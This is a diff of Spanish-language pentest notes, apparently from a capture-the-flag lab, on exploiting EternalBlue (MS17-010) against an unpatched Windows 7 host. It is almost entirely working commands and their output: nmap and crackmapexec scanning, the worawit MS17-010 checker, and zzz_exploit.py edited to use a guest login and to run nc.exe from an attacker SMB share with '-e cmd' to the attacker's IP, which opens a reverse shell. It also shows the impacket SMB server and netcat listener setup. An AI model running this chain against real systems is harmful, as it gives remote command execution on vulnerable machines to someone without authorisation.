@@ -4,7 +4,7 @@
 
  La actualización de seguridad de Windows del 14 de marzo de 2017 resolvió el problema a través del parche de seguridad MS17-010, para todas las versiones de Windows que en ese momento eran mantenidas por la compañía: Windows Vista, Windows 7, Windows 8.1, Windows 10, Windows Server 2008, Windows Server 2012, y Windows Server 2016.10 Las versiones antiguas, como Windows XP, Windows 8, o Windows Server 2003, no han recibido dicho parche. (La extensión del periodo de mantenimiento para Windows XP había acabado hace tres años, el 8 de abril de 2014, y el de Windows Server el 14 de julio de 2015). Microsoft recientemente liberó el parche para Windows XP y Server 2003.
 
-
+        ::: crackmapexec smb ip_targetHere            //// 445
 
 ::: locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
 
@@ -23,6 +23,8 @@
         "version"
         "vuln"
 
+            
+  COMPROBAR SI ES VULNERABLE A ETERNALBLUE
 ::: nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
 
         "vuln and safe"  mejor para detectar vuln. sin generar una denegaci[on de servicios, etc.
@@ -40,8 +42,49 @@
 
 
 
+
 google::  ms17-010  zzz_exploit.py                #/#/#/ github.com/worawit/MS17-010
 
 ::: git clone https://github.com/worawit/MS17-010
  :: cd SM17-010
- :: python2 checker.py ipTargetHere
+ :: python2  checker.py  ipTargetHere
+
+        Target OS: Windows 7 Professional 7601 Service Pack 1
+        The target is not patched
+
+        === Testing named pipes ===
+        spoolss: STATUS_ACCESS_DENIED
+        samr: STATUS_ACCESS_DENIED
+        netlogon: STATUS_ACCESS_DENIED
+        lsarpc: STATUS_ACCESS_DENIED
+        browser: STATUS_ACCESS_DENIED
+
+::: vim checker.py
+   linea 14...   USERNAME = ''   ==>>  USERNAME = 'guest'      /// agregar guest para indicar que es un usuario invitado
+::: python2  checker.py  ipTarged_Here
+
+        Target OS: Windows 7 Professional 7601 Service Pack 1
+        The target is not patched
+
+        === Testing named pipes ===
+        spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+        samr: Ok (64 bit)             .......<<<<<------ !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
+        lsarpc: Ok (64 bit)
+        browser: Ok (64 bit)
+
+
+::: vim zzz_exploit.py
+ :: ##linea 33  USERNAME = ''  ==>> USERNAME = 'guest'
+ :: ##buscamos en vim 'cmd' (vim:: /cmd)  ##func[on smb_pwn
+      
+	    service_exec(conn, r'cmd /c \\ipKali_here\smbFolder\nc.exe -e cmd ipKali_here 443')   ## si 2 ipKali :v
+
+
+
+
+::: impacket-smbserver smbFolder $(pwd) -smb2support
+
+::: rlwrap nc -lnvp 443
+
+::: python2 zzz_exploit.py samr           ###(python2 cheker.py ipTarged_Here ==> samr)
